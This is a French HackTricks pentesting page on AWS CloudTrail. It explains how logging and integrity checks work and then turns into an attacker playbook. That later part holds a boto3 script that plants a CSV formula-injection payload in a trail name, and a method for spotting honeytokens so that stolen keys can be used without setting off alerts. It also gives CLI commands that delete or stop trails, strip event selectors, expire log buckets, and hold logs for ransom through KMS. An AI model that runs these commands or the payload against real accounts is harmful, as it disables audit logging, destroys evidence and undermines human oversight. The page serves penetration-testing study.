# AWS - Enum√©ration de CloudTrail

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **CloudTrail**

AWS CloudTrail **enregistre et surveille l'activit√© au sein de votre environnement AWS**. Il capture des **journaux d'√©v√©nements d√©taill√©s**, indiquant qui a fait quoi, quand et d'o√π, pour toutes les interactions avec les ressources AWS. Cela permet de suivre les modifications et les actions, d'aider √† l'analyse de s√©curit√©, √† l'audit de conformit√© et au suivi des modifications des ressources. CloudTrail est essentiel pour comprendre le comportement des utilisateurs et des ressources, renforcer les postures de s√©curit√© et garantir la conformit√© r√©glementaire.

Chaque √©v√©nement enregistr√© contient :

* Le nom de l'API appel√©e : `eventName`
* Le service appel√© : `eventSource`
* L'heure : `eventTime`
* L'adresse IP : `SourceIPAddress`
* La m√©thode de l'agent : `userAgent`. Exemples :
* Signing.amazonaws.com - Depuis la console de gestion AWS
* console.amazonaws.com - Utilisateur principal du compte
* lambda.amazonaws.com - AWS Lambda
* Les param√®tres de la requ√™te : `requestParameters`
* Les √©l√©ments de r√©ponse : `responseElements`

Les √©v√©nements sont √©crits dans un nouveau fichier journal **environ toutes les 5 minutes dans un fichier JSON**, ils sont conserv√©s par CloudTrail et enfin, les fichiers journaux sont **livr√©s √† S3 environ 15 minutes apr√®s**.\
Les journaux de CloudTrail peuvent √™tre **agr√©g√©s entre les comptes et les r√©gions**.\
CloudTrail permet d'utiliser **l'int√©grit√© des fichiers journaux afin de pouvoir v√©rifier que vos fichiers journaux n'ont pas √©t√© modifi√©s** depuis leur livraison par CloudTrail. Il cr√©e un hachage SHA-256 des journaux dans un fichier de synth√®se. Un hachage sha-256 des nouveaux journaux est cr√©√© toutes les heures.\
Lors de la cr√©ation d'une piste, les s√©lecteurs d'√©v√©nements vous permettent d'indiquer la piste √† enregistrer : √©v√©nements de gestion, de donn√©es ou d'informations.

Les journaux sont enregistr√©s dans un compartiment S3. Par d√©faut, le chiffrement c√¥t√© serveur est utilis√© (SSE-S3) afin qu'AWS d√©chiffre le contenu pour les personnes qui y ont acc√®s, mais pour une s√©curit√© suppl√©mentaire, vous pouvez utiliser SSE avec KMS et vos propres cl√©s.

Les journaux sont stock√©s dans un **compartiment S3 avec ce format de nom** :

* **`NomDuCompartiment/AWSLogs/IDDuCompte/CloudTrail/NomDeLaR√©gion/AAA/MM/JJ`**
* √âtant donn√© que le nom du compartiment est : **`aws-cloudtrail-logs-<IDDuCompte>-<al√©atoire>`**
* Exemple : **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

√Ä l'int√©rieur de chaque dossier, chaque journal aura un **nom suivant ce format** : **`IDDuCompte_CloudTrail_NomDeLaR√©gion_AAAA-MM-JJTHHMMZ_Al√©atoire.json.gz`**

Convention de nommage des fichiers journaux

![](<../../../../.gitbook/assets/image (29).png>)

De plus, les **fichiers de synth√®se (pour v√©rifier l'int√©grit√© des fichiers)** se trouvent dans le **m√™me compartiment** :

![](<../../../../.gitbook/assets/image (22).png>)

### Agr√©ger les journaux de plusieurs comptes

* Cr√©ez une piste dans le compte AWS o√π vous souhaitez que les fichiers journaux soient livr√©s
* Appliquez des autorisations au compartiment S3 de destination permettant l'acc√®s intercompte pour CloudTrail et autorisez chaque compte AWS qui a besoin d'y acc√©der
* Cr√©ez une nouvelle piste dans les autres comptes AWS et s√©lectionnez l'utilisation du compartiment cr√©√© √† l'√©tape 1

Cependant, m√™me si vous pouvez enregistrer tous les journaux dans le m√™me compartiment S3, vous ne pouvez pas agr√©ger les journaux CloudTrail de plusieurs comptes dans un journal CloudWatch appartenant √† un seul compte AWS.

### CloudTrail de tous les comptes d'une organisation en un seul

Lors de la cr√©ation d'un CloudTrail, il est possible d'indiquer d'activer CloudTrail pour tous les comptes de l'organisation et d'obtenir les journaux dans un seul compartiment :

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

De cette fa√ßon, vous pouvez facilement configurer CloudTrail dans toutes les r√©gions de tous les comptes et centraliser les journaux dans 1 compte (que vous devriez prot√©ger).

### V√©rification des fichiers journaux

Vous pouvez v√©rifier que les journaux n'ont pas √©t√© modifi√©s en ex√©cutant

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Journaux vers CloudWatch

**CloudTrail peut automatiquement envoyer des journaux vers CloudWatch afin que vous puissiez d√©finir des alertes qui vous avertissent lorsque des activit√©s suspectes sont effectu√©es.**\
Notez que pour permettre √† CloudTrail d'envoyer les journaux vers CloudWatch, un **r√¥le** doit √™tre cr√©√© pour autoriser cette action. Si possible, il est recommand√© d'utiliser le r√¥le par d√©faut d'AWS pour effectuer ces actions. Ce r√¥le permettra √† CloudTrail de :

* CreateLogStream : cela permet de cr√©er un flux de journaux CloudWatch
* PutLogEvents : livrer les journaux CloudTrail au flux de journaux CloudWatch

### Historique des √©v√©nements

L'historique des √©v√©nements CloudTrail vous permet d'inspecter dans un tableau les journaux qui ont √©t√© enregistr√©s :

![](<../../../../.gitbook/assets/image (24).png>)

### Insights

**CloudTrail Insights** analyse automatiquement les √©v√©nements de gestion d'√©criture des pistes CloudTrail et vous alerte en cas d'activit√© inhabituelle. Par exemple, si le nombre d'√©v√©nements `TerminateInstance` augmente par rapport aux r√©f√©rences √©tablies, vous le verrez comme un √©v√©nement Insight. Ces √©v√©nements facilitent plus que jamais la **recherche et la r√©ponse √† une activit√© API inhabituelle**.

Les informations sont stock√©es dans le m√™me compartiment que les journaux CloudTrail dans : `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### S√©curit√©

| Int√©grit√© des fichiers journaux CloudTrail | <ul><li>V√©rifie si les journaux ont √©t√© alt√©r√©s (modifi√©s ou supprim√©s)</li><li><p>Utilise des fichiers de hachage (cr√©e un hachage pour chaque fichier)</p><ul><li>Hachage SHA-256</li><li>Hachage SHA-256 avec RSA pour la signature num√©rique</li><li>Cl√© priv√©e d√©tenue par Amazon</li></ul></li><li>Prend 1 heure pour cr√©er un fichier de hachage (effectu√© √† chaque heure)</li></ul> |
| ----------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Emp√™cher l'acc√®s non autoris√©             | <ul><li><p>Utilisez des strat√©gies IAM et des strat√©gies de compartiment S3</p><ul><li>√©quipe de s√©curit√© -> acc√®s administratif</li><li>v√©rificateurs -> acc√®s en lecture seule</li></ul></li><li>Utilisez SSE-S3/SSE-KMS pour chiffrer les journaux</li></ul>                                                                                                                               |
| Emp√™cher la suppression des fichiers journaux | <ul><li>Restreindre l'acc√®s √† la suppression avec IAM et les strat√©gies de compartiment</li><li>Configurer la suppression S3 MFA</li><li>Valider avec la validation des fichiers journaux</li></ul>                                                                                                                                                                                          |

## Conseiller d'acc√®s

Le conseiller d'acc√®s AWS s'appuie sur les **journaux CloudTrail des 400 derniers jours pour recueillir ses informations**. CloudTrail enregistre l'historique des appels d'API AWS et des √©v√©nements associ√©s effectu√©s dans un compte AWS. Le conseiller d'acc√®s utilise ces donn√©es pour **indiquer quand les services ont √©t√© utilis√©s pour la derni√®re fois**. En analysant les journaux CloudTrail, le conseiller d'acc√®s peut d√©terminer les services AWS auxquels un utilisateur IAM ou un r√¥le a acc√©d√© et quand cet acc√®s a eu lieu. Cela permet aux administrateurs AWS de prendre des d√©cisions √©clair√©es sur **l'affinement des autorisations**, car ils peuvent identifier les services qui n'ont pas √©t√© utilis√©s pendant de longues p√©riodes et r√©duire √©ventuellement les autorisations trop larges en fonction des mod√®les d'utilisation r√©elle.

{% hint style="success" %}
Par cons√©quent, le conseiller d'acc√®s informe sur **les autorisations inutiles accord√©es aux utilisateurs** afin que l'administrateur puisse les supprimer.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

## Actions

### √ânum√©ration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **Injection de CSV**

Il est possible d'effectuer une injection de CSV dans CloudTrail qui ex√©cutera du code arbitraire si les journaux sont export√©s en CSV et ouverts avec Excel.\
Le code suivant g√©n√©rera une entr√©e de journal avec un nom de Trail incorrect contenant la charge utile :
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Pour plus d'informations sur les injections CSV, consultez la page:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Pour plus d'informations sur cette technique sp√©cifique, consultez [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Contourner la d√©tection**

### Contourner les **HoneyTokens**

Les HoneyTokens sont cr√©√©s pour **d√©tecter l'exfiltration d'informations sensibles**. Dans le cas d'AWS, ce sont des **cl√©s AWS dont l'utilisation est surveill√©e**, si quelque chose d√©clenche une action avec cette cl√©, alors quelqu'un doit avoir vol√© cette cl√©.

Cependant, cette surveillance est effectu√©e via **CloudTrail**, et il y a certains **services AWS qui n'envoient pas de journaux √† CloudTrail** (trouvez la [liste ici](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Certains de ces services **r√©pondront** avec une **erreur** contenant le **ARN du r√¥le de la cl√©** si quelqu'un non autoris√© (la cl√© HoneyToken) essaie d'y acc√©der.

De cette fa√ßon, un **attaquant peut obtenir l'ARN de la cl√© sans d√©clencher de journal**. Dans l'ARN, l'attaquant peut voir l'**ID du compte AWS et le nom**, il est facile de conna√Ætre les ID et noms des comptes des entreprises HoneyToken, de cette fa√ßon un attaquant peut identifier si le jeton est un HoneyToken.

![](<../../../../.gitbook/assets/image (65).png>)

#### **D√©tection des HoneyTokens**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) d√©tecte si une cl√© appartient √† [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* Si **`canarytokens.org`** appara√Æt dans le nom du r√¥le ou si l'ID du compte **`534261010715`** appara√Æt dans le message d'erreur.
* En les testant plus r√©cemment, ils utilisent le compte **`717712589309`** et ont toujours la cha√Æne **`canarytokens.com`** dans le nom.
* Si **`SpaceCrab`** appara√Æt dans le nom du r√¥le dans le message d'erreur.
* **SpaceSiren** utilise des **uuids** pour g√©n√©rer des noms d'utilisateur : `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Si le **nom ressemble √† une g√©n√©ration al√©atoire**, il y a de fortes chances que ce soit un HoneyToken.

{% hint style="danger" %}
Notez que toutes les API publiques d√©couvertes qui ne cr√©ent pas de journaux CloudTrail sont maintenant corrig√©es, vous devrez peut-√™tre trouver les v√¥tres...
{% endhint %}

Pour plus d'informations, consultez la [**recherche originale**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### Acc√®s √† une infrastructure tierce

Certains services AWS vont **cr√©er une infrastructure** telle que des **bases de donn√©es** ou des clusters **Kubernetes** (EKS). Un utilisateur **communiquant directement avec ces services** (un port de base de donn√©es ou l'API Kubernetes) **n'utilisera pas l'API AWS**, donc CloudTrail ne pourra pas voir cette communication.

Par cons√©quent, un utilisateur ayant acc√®s √† EKS et ayant d√©couvert l'URL de l'API EKS pourrait g√©n√©rer un jeton localement et **communiquer directement avec le service API sans √™tre d√©tect√© par CloudTrail**.

Plus d'informations sur:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modification de la configuration de CloudTrail

#### Supprimer les pistes
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Arr√™ter les trails

Pour arr√™ter un trail dans AWS CloudTrail, vous pouvez utiliser l'interface de ligne de commande AWS (AWS CLI) ou la console AWS Management.

##### Utilisation de l'AWS CLI

```bash
aws cloudtrail stop-logging --name <trail-name>
```

##### Utilisation de la console AWS Management

1. Ouvrez la console AWS Management et acc√©dez √† la page CloudTrail.
2. S√©lectionnez le trail que vous souhaitez arr√™ter.
3. Cliquez sur le bouton "Stop logging" dans la barre d'outils sup√©rieure.

Une fois que vous avez arr√™t√© un trail, il ne collectera plus de nouveaux √©v√©nements. Cependant, les √©v√©nements d√©j√† enregistr√©s dans le trail resteront disponibles pour l'analyse et la recherche.
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### D√©sactiver l'enregistrement multi-r√©gion

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### D√©sactiver la journalisation par les s√©lecteurs d'√©v√©nements

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

Dans le premier exemple, un s√©lecteur d'√©v√©nements unique est fourni sous la forme d'un tableau JSON avec un seul objet. Le `"ReadWriteType": "ReadOnly"` indique que le **s√©lecteur d'√©v√©nements ne doit capturer que les √©v√©nements en lecture seule** (ainsi, les insights de CloudTrail **ne v√©rifieront pas les √©v√©nements d'√©criture**, par exemple).

Vous pouvez personnaliser le s√©lecteur d'√©v√©nements en fonction de vos besoins sp√©cifiques.

#### Suppression des journaux via la politique de cycle de vie S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modification de la configuration du bucket

* Supprimer le bucket S3
* Modifier la strat√©gie du bucket pour refuser toute √©criture depuis le service CloudTrail
* Ajouter une strat√©gie de cycle de vie au bucket S3 pour supprimer les objets
* D√©sactiver la cl√© KMS utilis√©e pour chiffrer les journaux CloudTrail

### Ran√ßongiciel CloudTrail

#### Ran√ßongiciel S3

Vous pouvez **g√©n√©rer une cl√© asym√©trique** et faire en sorte que **CloudTrail chiffre les donn√©es** avec cette cl√© et **supprimer la cl√© priv√©e** afin que le contenu de CloudTrail ne puisse pas √™tre r√©cup√©r√©.\
Il s'agit essentiellement d'un **ran√ßongiciel S3-KMS** expliqu√© dans :

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**Ran√ßongiciel KMS**

Il s'agit d'une m√©thode plus simple pour effectuer l'attaque pr√©c√©dente avec des exigences de permissions diff√©rentes :

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **R√©f√©rences**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
